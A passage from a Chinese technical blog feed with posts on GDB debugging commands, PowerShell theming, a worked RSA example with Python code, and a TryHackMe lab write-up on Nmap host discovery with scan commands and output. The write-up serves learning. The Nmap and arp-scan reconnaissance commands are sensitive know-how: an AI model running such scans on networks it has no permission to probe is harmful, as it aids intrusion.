class="header"><th>指令</th><th>作用</th></tr></thead><tbody><tr class="odd"><td>p（全称print） 变量名</td><td>打印一次变量名/函数调用对应的值</td></tr><tr class="even"><td>disp（display） 变量名</td><td>设置在每次停下时都打印该变量名/函数调用对应的值</td></tr></tbody></table><p>以p为例：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p n      &lt;---打印代码中变量n的值</span><br><span class="line"><span class="variable">$1</span> = 1</span><br></pre></td></tr></tbody></table></figure><p>以disp为例：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disp n</span><br><span class="line">1: n = 1</span><br></pre></td></tr></tbody></table></figure></li><li><p>退出调试</p><p>直接输入<code>q</code>并回车</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) q</span><br><span class="line">A debugging session is active.</span><br><span class="line"></span><br><span class="line">Inferior 1 [process 467365] will be killed.</span><br><span class="line"></span><br><span class="line">Quit anyway? (y or n) y</span><br><span class="line">root@ls-jc2uT1jQ:~<span class="comment">#    &lt;---已退出</span></span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="gdb汇编调试">GDB汇编调试</h2><h3 id="部分指令"><strong>部分指令</strong></h3><table><colgroup><col style="width: 28%"><col style="width: 71%"></colgroup><thead><tr class="header"><th>指令</th><th>作用</th></tr></thead><tbody><tr class="odd"><td>si</td><td>单步执行，进入函数内部</td></tr><tr class="even"><td>ni</td><td>单步执行，不进入函数内部</td></tr><tr class="odd"><td>disp /i $pc(或寄存器)</td><td>显示出当前执行的语句，下一行展示相关寄存器和堆栈内容的变化</td></tr><tr class="even"><td>i r</td><td>查看所有寄存器的值</td></tr><tr class="odd"><td>i r rax</td><td>查看rax寄存器的值</td></tr><tr class="even"><td>layout src</td><td>显示源代码窗口</td></tr><tr class="odd"><td>layout asm</td><td>显示反汇编窗口</td></tr><tr class="even"><td>disassemble</td><td>获取汇编代码</td></tr></tbody></table><h3 id="查看指定内存地址处的内容"><strong>查看指定内存地址处的内容</strong>：</h3><p>命令格式：<strong>x/nfu addr</strong>如：<code>(gdb) x/3sw  $eax</code></p><p><strong>x : examine 的缩写</strong></p><p><strong>n : 表示要显示的内存单元个数</strong></p><p><strong>f : 表示显示方式, 可取如下值</strong></p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br></pre></td></tr></tbody></table></figure><p><strong>u表示一个地址单元的长度</strong>，与n一起表示显示的地址长度</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b表示单字节，</span><br><span class="line">h表示双字节，</span><br><span class="line">w表示四字节，</span><br><span class="line">g表示八字节</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>GDB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gdb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修改PowerShell的主题</title>
    <link href="/2023/03/14/%E4%BF%AE%E6%94%B9PowerShell%E4%B8%BB%E9%A2%98/"/>
    <url>/2023/03/14/%E4%BF%AE%E6%94%B9PowerShell%E4%B8%BB%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>我使用的是<code>oh-my-posh</code>。</p><p><code>oh-my-posh</code> 是一个 <code>PowerShell</code>主题框架，用于美化 <code>PowerShell</code>提示符（prompt）。它可以让你自定义 <code>PowerShell</code>提示符的样式，使其更加易读和美观。可参考官网的主题样式：https://ohmyposh.dev/docs/themes</p><p>通过输入</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-PoshPrompt PowerLine</span><br></pre></td></tr></tbody></table></figure><p>可预览<code>PowerLine</code>主题，这只是暂时性的 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/b5787722d59b4286b340086f0ab1145f.png" alt="在这里插入图片描述"></p><p>想要永久修改可通过执行以下命令用记事本打开配置文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad $PROFILE</span><br></pre></td></tr></tbody></table></figure><p>打开后如下： <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/31e8516211044bc2a8bd3b0646a5db98.png" alt="在这里插入图片描述"></p><p>通过修改配置文件中的主题可修改默认打开主题： <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1648e8d3bcf6411b9d307a5aa18afb37.png" alt="在这里插入图片描述">若将上图中的"Sorin"改为“Agnoster”，则下次打开powershell便是修改后的主题。</p>]]></content>
    
    
    <categories>
      
      <category>命令行</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PowerShell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RSA算法</title>
    <link href="/2023/01/27/RSA%E7%AE%97%E6%B3%95/"/>
    <url>/2023/01/27/RSA%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>参考：https://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</p><p>​https://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html</p><h2 id="非对称加密">非对称加密</h2><p>它需要两个<a href="https://zh.wikipedia.org/wiki/密钥">密钥</a>，一个是公开密钥，另一个是私有密钥；公钥用作加密，私钥则用作解密。使用公钥把<a href="https://zh.wikipedia.org/wiki/明文">明文</a>加密后所得的<a href="https://zh.wikipedia.org/wiki/密文">密文</a>，只能用相对应的<a href="https://zh.wikipedia.org/wiki/私钥">私钥</a>才能解密并得到原本的明文，最初用来加密的公钥不能用作解密。由于加密和解密需要两个不同的密钥，故被称为非对称加密；不同于加密和解密都使用同一个密钥的<a href="https://zh.wikipedia.org/wiki/对称加密">对称加密</a>。公钥可以公开，可任意向外发布；私钥不可以公开，必须由用户自行严格秘密保管，绝不透过任何途径向任何人提供，也不会透露给被信任的要通信的另一方。（维基百科）</p><h2 id="前置知识点">前置知识点</h2><h3 id="互质">互质</h3><ol type="1"><li>任意两个质数构成互质关系，比如13和61。</li></ol><p>　2.一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。</p><p>　3.如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。</p><p>　4. 1和任意一个自然数是都是互质关系，比如1和99。</p><p>　5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。</p><p>　6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</p><h3 id="欧拉函数">欧拉函数</h3><p>任意给定正整数 n，在小于等于 n 的正整数中，有 x 个与 n构成互质关系的正整数。计算 x 的方法就叫欧拉函数，用 φ(n) 表示。</p><p>例：在 1 到 8 之中，与 8 形成互质关系的是 1、3、5、7，所以 φ(n) =4。</p><p>关于 φ(n) 的计算方法，共五种情况：</p><ol type="1"><li><p>如果n=1，则 φ(1) = 1。因为1与任何数（包括自身）都构成互质关系。</p></li><li><p>如果n是质数，则 φ(n)=n-1。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。</p></li><li><p>如果n是质数的某一个次方，即 n = p<sup>k</sup>(p为质数，k为大于等于1的整数)，则</p><p><img src="https://chart.googleapis.com/chart?cht=tx&amp;chl=\phi(p%5E%7Bk%7D)%3Dp%5E%7Bk%7D-p%5E%7Bk-1%7D&amp;chs=40"></p><p>比如 φ(8) = φ(2<sup>3</sup>) =2<sup>3</sup> - 2<sup>2</sup> = 8 -4 =4。</p><p>这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p<sup>(k-1)</sup>个，即1×p、2×p、3×p、...、p<sup>(k-1)</sup>×p，把它们去除，剩下的就是与n互质的数。</p><p>上面的式子还可以写成下面的形式：</p><p><img src="https://chart.googleapis.com/chart?cht=tx&amp;chl=\phi(p%5E%7Bk%7D)%3Dp%5E%7Bk%7D-p%5E%7Bk-1%7D%3Dp%5E%7Bk%7D(1-\frac%7B1%7D%7Bp%7D)&amp;chs=60"></p><p>可以看出，上面的第二种情况是 k=1 时的特例。</p></li><li><p>如果n可以分解成两个互质的整数之积，</p><blockquote><p>　　n = p1 × p2</p></blockquote><p>则</p><blockquote><p>　　φ(n) = φ(p1p2) = φ(p1)φ(p2)</p></blockquote></li><li><p>任意一个大于1的正整数，都可以写成一系列质数的积，根据前面几种情况可以得出公式：</p><figure><img src="https://chart.googleapis.com/chart?cht=tx&amp;chl=\phi(n)%3Dn(1-\frac%7B1%7D%7Bp_%7B1%7D%7D)(1-\frac%7B1%7D%7Bp_%7B2%7D%7D)...(1-\frac%7B1%7D%7Bp_%7Br%7D%7D)&amp;chs=60" alt="img"><figcaption aria-hidden="true">img</figcaption></figure></li></ol><h3 id="欧拉定理">欧拉定理</h3><p>如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221017000738261.png"></p><p>也就是说，a的φ(n)次方被n除的余数为1。</p><p><strong>特殊情况：</strong></p><p>假设正整数a与质数p互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221017000807005.png"></p><h3 id="模反元素模逆元">模反元素（模逆元）</h3><p>如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1被n整除，或者说ab被n除的余数是1。</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220912153915183.png"></p><p>此时，b 就叫做 a 的模反元素。</p><h2 id="rsa算法">RSA算法</h2><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230127173626821.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230127173800453.png"></p><h3 id="随机选择两个不相等的质数-p-和-q">1.随机选择两个不相等的质数 p 和q</h3><p>假设选择了61和53。</p><h3 id="计算-p-和-q-的乘积-n">2.计算 p 和 q 的乘积 n</h3><p>把61和53相乘。</p><blockquote><p>n = 61×53 = 3233</p></blockquote><p>n的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。</p><h3 id="计算-n-的欧拉函数-φn">3.计算 n 的欧拉函数 φ(n)</h3><p>根据公式：</p><blockquote><p>φ(n) = (p-1)(q-1)</p></blockquote><p>算出 φ(3233) 等于 60×52 ，即 3120 。</p><h3 id="随机选择一个整数-e条件是-1-e-φn-且-e-与-φn-互质">4.随机选择一个整数e，条件是 1 &lt; e &lt; φ(n) ，且 e 与 φ(n) 互质</h3><p>假设随机选择了17。（实际应用中，常常选择65537。）</p><h3 id="计算-e-对于-φn-的模反元素-d">5.计算 e 对于 φ(n) 的模反元素d</h3><p><strong>d</strong> 满足公式：</p><blockquote><p>ed ≡ 1 (mod φ(n))</p></blockquote><p>等价于：</p><blockquote><p>ed - 1 = kφ(n)</p></blockquote><p>要找到模反元素d，实质上就是对下面这个二元一次方程求解：</p><blockquote><p>ex + φ(n)y = 1</p></blockquote><p>已知 e=17，φ(n)=3120，可得方程：</p><blockquote><p>17x + 3120y = 1</p></blockquote><p>利用扩展欧几里得算法求出结果（代码参考：https://xz.aliyun.com/t/2446）</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用gmpy2直接求解模反元素 </span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="built_in">print</span>(gmpy2.invert(<span class="number">17</span>, <span class="number">3120</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#用于扩展欧几里得算法的 Python 程序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span> ( a , b ):</span><br><span class="line">     <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         x , y , q = egcd( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">         x , y = y, ( x - (a // b) * y )</span><br><span class="line">         <span class="keyword">return</span> x, y, q </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> egcd(a,b)[<span class="number">0</span>]%b <span class="comment">#求a模b得逆元</span></span><br><span class="line"><span class="built_in">print</span>(mod_inv(<span class="number">17</span>,<span class="number">3120</span>))</span><br></pre></td></tr></tbody></table></figure><p>可得 d = 2753 。</p><h3 id="将-n-和-e-封装成公钥n-和-d-封装成私钥">6.将 n 和 e 封装成公钥，n和 d 封装成私钥</h3><p>在上述的例子中，n=3233，e=17，d=2753，所以公钥就是(3233,17)，私钥就是（3233, 2753）。</p><h3 id="rsa算法的可靠性">7.RSA算法的可靠性</h3><p>上述共出现了 p 、q 、n 、φ(n) 、e 、d 这六个数字，公钥用到了 n 和 e，其余的四个数字都不公开。最关键的是 d，一旦 d泄露，就等于私钥泄露。</p><p>那么如何推导出 d ？</p><blockquote><p>（1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。</p><p>（2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。</p><p>（3）n=pq。只有将n因数分解，才能算出p和q。</p></blockquote><p>因此只有先计算出 p 和 q ，才有可能推导出 d 。</p><h3 id="加密和解密">8.加密和解密</h3><h4 id="加密用公钥n-e">（1）加密用公钥（n, e）</h4><p>假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e)对m进行加密（<strong>m为原文</strong>）。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。</p><p>加密的公式如下：</p><blockquote><p>m<sup>e</sup> ≡ c (mod n)</p></blockquote><p>爱丽丝的公钥是 (3233,17)，鲍勃的m假设是65，那么可以算出下面的等式：</p><blockquote><p>65<sup>17</sup> ≡ 2790 (mod 3233)</p></blockquote><p>于是，c等于2790，鲍勃就把2790发给了爱丽丝，即 c是<strong>密文</strong>。</p><h4 id="解密用私钥n-d">（2）解密用私钥（n, d）</h4><p>爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密</p><blockquote><p>c<sup>d</sup> ≡ m (mod n)</p></blockquote><p>也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233,2753)，那么，爱丽丝算出</p><blockquote><p>2790<sup>2753</sup> ≡ 65 (mod 3233)</p></blockquote><p>解得加密前的原文：65。</p><p>至此，"加密--解密"的整个过程全部完成。</p><p>由上述公式可知，如果不知道 d ，就无法通过 c 求出 m 。</p><h3 id="私钥解密的证明">9.私钥解密的证明</h3><p>详见：https://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html</p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap Live Host Discovery</title>
    <link href="/2023/01/24/Nmap-live-host/"/>
    <url>/2023/01/24/Nmap-live-host/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/nmap01</p><h2 id="introduction">Introduction</h2><p>这个房间主要介绍了如何使用 Nmap 查找活动主机(livehost)。用于发现活动主机的方法包括：</p><ul><li>ARP 扫描：这种扫描使用 ARP 请求来发现活动主机。</li><li>ICMP 扫描：这种扫描使用 ICMP 请求来标识活动主机。</li><li>TCP / UDP ping 扫描：此扫描将数据包发送到 TCP 端口和 UDP端口以确定活动主机。</li></ul><p>我们还将介绍两种扫描器：<code>arp-scan</code>和<code>masscan</code>。并解释它们如何与Nmap 发现活动主机这一部分重叠。</p><p>下面是 Nmap扫描通常要经历的步骤，其中很多步骤是可选的，取决于提供的参数。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230122092609574.png" alt="image-20230122092609574"><figcaption aria-hidden="true">image-20230122092609574</figcaption></figure><h2 id="subnetworks子网">Subnetworks（子网）</h2><p><em>网段</em>是使用共享介质连接的一组计算机，这些介质可以是以太网交换机或 WIFI接入点。在IP网络中，<em>子网</em>通常相当于连接在一起并配置为使用相同路由器的一个或多个网段。网段是指物理连接，而子网是指逻辑连接。</p><p>下图中有四个网段或子网。每个子网有它自己的 IP地址范围，并通过路由器连接到更大的网络中。根据每个网络，可能有防火墙强制执行安全策略。</p><figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/aa787518e856e0094cb40da8399be0f3.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>如果你连接到相同的子网，你会期望你的扫描器依赖于 ARP(地址解析协议)查询来发现活动主机。ARP 查询的目的是获取硬件地址(MAC 地址)，这样就可以通过链路层进行通信，然而，我们可以利用这一点来推断主机是否在线。</p><p>如果你在网络 A 中，使用 ARP只能发现该子网（10.1.100.0/24）中的设备。假设你已连接到与目标系统子网不同的子网。在这种情况下，扫描仪生成的所有数据包将通过默认网关（路由器）进行路由，以到达另一个子网上的系统。但是，ARP查询不会被路由，因此无法越过子网路由器。ARP是一个链路层协议，ARP 数据包被绑定到其对应的子网。</p><h2 id="enumerating-targets枚举目标">EnumeratingTargets（枚举目标）</h2><p>在扫描之前，我们需要指定目标，一般而言，目标可以是：列表、范围或是一个子网，示例如下：</p><ul><li>list：<code>MACHINE_IP scanme.nmap.org example.com</code> 将扫描 3个IP地址。</li><li>range：<code>10.11.12.15-20</code>将扫描 6个IP地址：<code>10.11.12.15</code>、<code>10.11.12.16</code> ······以及<code>10.11.12.20</code>。</li><li>subnet：<code>MACHINE_IP/30</code>将扫描 4个IP地址。（转换为二进制来看，子网部分有 30 位，主机部分有 2位；因此共有 2<sup>2</sup>=4 个主机即 IP 地址）</li></ul><p>还可以提供一个文件作为目标列表的输入：<code>nmap -iL list_of_hosts.txt</code></p><p>如果要检查 Nmap将扫描的主机列表，则可以使用<code>nmap -sL TARGETS</code>。此选项将为你提供Nmap 将要扫描而无需扫描的主机的详细列表；但是，Nmap将尝试对所有目标进行反向 DNS解析，以获取其域名。域名可能会向渗透测试者透露各种信息。（如果你不希望Nmap 连接到DNS服务器，则可以添加<code>-n</code>。）</p><h2 id="discovering-live-hosts">Discovering Live Hosts</h2><p>让我们回顾下图所示的 TCP/IP 层，利用协议来发现活动主机：</p><ul><li>ARP（链路层）：向网段上的广播地址发送一个帧，并要求具有特定 IP地址的计算机通过提供其MAC（硬件）地址进行响应。</li><li>ICMP（网络层）：ICMP有<a href="https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml">多种类型</a>。ICMPping使用类型 8（Echo）和类型 0（Echo Reply）。如果你想 ping同一子网上的系统，ARP 查询应该在 ICMP Echo之前使用。</li><li>TCP（传输层）：扫描仪可以向通用TCP或UDP端口发送一个特制的数据包，以检查目标是否会响应。此方法非常有效，尤其是当ICMP Echo 被阻止时。</li><li>UDP（传输层）：同上。</li></ul><figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/745e0412b319d324352c7b29863b74f4.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><h2 id="nmap-host-discovery-using-arp">Nmap Host Discovery UsingARP</h2><p>Nmap 遵循以下方法来发现活动主机：</p><ol type="1"><li>当特权用户试图扫描本地网络（以太网）上的目标时，Nmap使用ARP请求。特权用户是<code>root</code>用户或属于<code>sudoers</code>并可以运行<code>sudo</code>的用户。</li><li>当特权用户尝试扫描本地网络外的目标时，Nmap 使用 ICMP回显请求、端口80的TCP ACK（确认）、端口443的 TCP SYN（同步）和 ICMP时间戳请求。</li><li>当非特权用户试图扫描本地网络之外的目标时，Nmap 采用 TCP三次握手方式，将 SYN 数据包发送到 80 和 443 端口。</li></ol><p>默认情况下，Nmap 使用 ping扫描来查找活动主机，并且只扫描活动主机。如果希望使用 Nmap在不扫描系统端口的情况下发现在线主机，可以使用<code>nmap -sn TARGETS</code>。</p><p>只有当你和目标系统在同一子网中时，ARP扫描才可能使用。在以太网（802.3）和WiFi（802.11）上，你需要知道目标系统的 MAC地址才能够与之通信。MAC地址是链路层报头所必需的；报头包含源 MAC地址和目标 MAC 地址以及其他字段。为了获得 MAC 地址，操作系统会发送 ARP查询。ARP 查询仅在目标与你所在的子网相同时有效，即在相同的以太网或 WiFi上。在对本地网络进行 Nmap 扫描期间，应该会看到许多 ARP 查询。如果您希望Nmap 只执行 ARP扫描而不扫描端口，那么可以使用<code>Nmap -PR -sn TARGETS</code>，其中<code>-PR</code>表示你只需要进行ARP 扫描。下面的示例显示了 Nmap 使用 ARP进行主机查找而不进行端口扫描。运行<code>nmap -PR -sn MACHINE_IP/24</code>来发现与目标机器在同一子网上的所有系统。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PR -sn 10.10.210.6/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 07:12 BST</span><br><span class="line">Nmap scan report for ip-10-10-210-75.eu-west-1.compute.internal (10.10.210.75)</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 02:83:75:3A:F2:89 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-210-100.eu-west-1.compute.internal (10.10.210.100)</span><br><span class="line">Host is up (-0.100s latency).</span><br><span class="line">MAC Address: 02:63:D0:1B:2D:CD (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-210-165.eu-west-1.compute.internal (10.10.210.165)</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 02:59:79:4F:17:B7 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-210-6.eu-west-1.compute.internal (10.10.210.6)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 3.12 seconds</span><br></pre></td></tr></tbody></table></figure><p>在本例中，AtackBox 的 IP 地址是10.10.210.6，它使用 ARP请求来发现同一子网上的活动主机。</p><figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f0ce4cd34b827f529255c5c73bb909d1.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>说到 ARP 扫描，我们应该提到一个围绕 ARP查询构建的扫描器：<code>arp-scan</code>；它提供了许多自定义扫描的选项。有关详细信息，请访问<a href="http://www.royhills.co.uk/wiki/index.php/Main_Page">arp-scannerwiki</a>。一个常见的选择是 <code>arp-scan --localnet</code> 或者简单的<code>arp-scan -l</code>。这个命令将发送 ARP 查询到本地网络上所有有效的IP地址。此外，如果你的系统有多个接口，并且你有兴趣发现其中一个上的活动主机，你可以使用<code>-I</code>指定具体接口，例如，<code>sudo arp-scan -I eth0 -l</code>将向<code>eth0</code>接口上的所有有效IP地址发送 ARP 查询。</p><p>在下面的示例中，我们使用<code>arp-scan ATTACKBOX_IP/24</code>扫描了AtackBox 的子网。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo arp-scan 10.10.210.6/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">WARNING: host part of 10.10.210.6/24 is non-zero</span><br><span class="line">Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)</span><br><span class="line">10.10.210.7502:83:75:3a:f2:89(Unknown)</span><br><span class="line">10.10.210.10002:63:d0:1b:2d:cd(Unknown)</span><br><span class="line">10.10.210.16502:59:79:4f:17:b7(Unknown)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9: 256 hosts scanned in 2.726 seconds (93.91 hosts/sec). 3 responded</span><br></pre></td></tr></tbody></table></figure><h2 id="nmap-host-discovery-using-icmp">Nmap Host Discovery UsingICMP</h2><p>我们可以 ping 目标网络上的每个 IP 地址，看看谁用 ping reply (ICMPType 0) 来响应我们的<code>ping</code> (ICMP Type 8/Echo)请求。尽管这将是最直接的方法，但它并不总是可靠的。许多防火墙会阻止 ICMPecho ；Windows 配置了一个主机防火墙，默认情况下阻止 ICMP echo请求。请记住，如果目标位于相同的子网上，则 ARP 查询将先于 ICMP请求。</p><h3 id="pe">-PE</h3><p>若要使用 ICMP echo request 来发现活动主机，请添加选项<code>-PE</code>。(记住，如果你不想进行端口扫描，请添加<code>-sn</code>。)如下图所示，ICMP echo 扫描通过发送 ICMP echo request来工作，并期望目标使用 ICMP echo reply 进行应答。</p><figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/25fb5fd5d2009cf69d7aae40e8fde2ec.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>在下面的示例中，我们使用<code>nmap -PE -sn MACHINE_IP/24</code>扫描了目标所在的子网。此扫描将向子网上的每个IP 地址发送 ICMP echo数据包。下面的输出显示了使用<code>sudo nmap -PE -sn MACHINE_IP/24</code>扫描虚拟机的C 类子网的结果。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 10:16 BST</span><br><span class="line">Nmap scan report for ip-10-10-68-50.eu-west-1.compute.internal (10.10.68.50)</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 02:95:36:71:5B:87 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-52.eu-west-1.compute.internal (10.10.68.52)</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 02:48:E8:BF:78:E7 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-77.eu-west-1.compute.internal (10.10.68.77)</span><br><span class="line">Host is up (-0.100s latency).</span><br><span class="line">MAC Address: 02:0F:0A:1D:76:35 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-110.eu-west-1.compute.internal (10.10.68.110)</span><br><span class="line">Host is up (-0.10s latency).</span><br><span class="line">MAC Address: 02:6B:50:E9:C2:91 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-140.eu-west-1.compute.internal (10.10.68.140)</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 02:58:59:63:0B:6B (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-142.eu-west-1.compute.internal (10.10.68.142)</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 02:C6:41:51:0A:0F (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-220.eu-west-1.compute.internal (10.10.68.220)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 02:25:3F:DB:EE:0B (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-222.eu-west-1.compute.internal (10.10.68.222)</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 02:28:B1:2E:B0:1B (Unknown)</span><br><span class="line">Nmap done: 256 IP addresses (8 hosts up) scanned in 2.11 seconds</span><br></pre></td></tr></tbody></table></figure><p>扫描输出显示八台主机已启动；此外，还显示了它们的MAC地址。一般来说，除非目标与我们的系统位于同一子网，否则我们没必要了解目标的MAC 地址。上面的输出表明，Nmap不需要发送 ICMP 